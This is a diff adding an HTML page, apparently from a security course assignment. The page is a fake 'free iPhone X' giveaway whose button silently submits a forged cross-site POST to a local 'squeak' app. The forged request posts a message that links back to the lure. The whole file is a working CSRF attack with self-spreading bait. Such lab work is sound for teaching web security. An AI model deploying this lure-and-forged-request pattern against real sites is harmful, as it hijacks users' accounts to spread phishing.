@@ -1,0 +1,32 @@
+<!doctype html>
+<html lang="en">
+<head><meta charset="utf-8"><title>Get The iPhone X FREE!</title></head>
+<body style="max-width: 760px; margin: 0 auto; text-align: center; padding: 20px;">
+    <div style="text-align: center;">
+        <h1>Get The iPhone X FREE!</h1>
+        <h5 style="font-weight: bold;">Worth 999$</h5>
+        <p style="text-align: left;">
+            A decade on and still innovating. With its Super Retina display, facial recognition
+            and wireless charging.
+            <br>
+            Want to review the best iPhone yet for FREE?
+        </p>
+        <p><button class="btn btn-primary btn-lg" onclick="submitCSRF()">Review Now!</button></p>
+    </div>
+    <script>
+        function submitCSRF() {
+            const LIVE_SERVER_LINK = "http://127.0.0.1:5500/assignment_3/CSRF_page.html"
+            const form = document.createElement('form');
+            form.method = 'POST';
+            form.action = 'https://localhost:8000/squeak';
+            const inp = document.createElement('input');
+            inp.type = 'hidden';
+            inp.name = 'squeak';
+            inp.value = `Click <a href='${LIVE_SERVER_LINK}'>here</a> to get the iPhobe X FREE!`;
+            form.appendChild(inp);
+            document.body.appendChild(form);
+            form.submit();
+        }
+    </script>
+</body>
+</html>
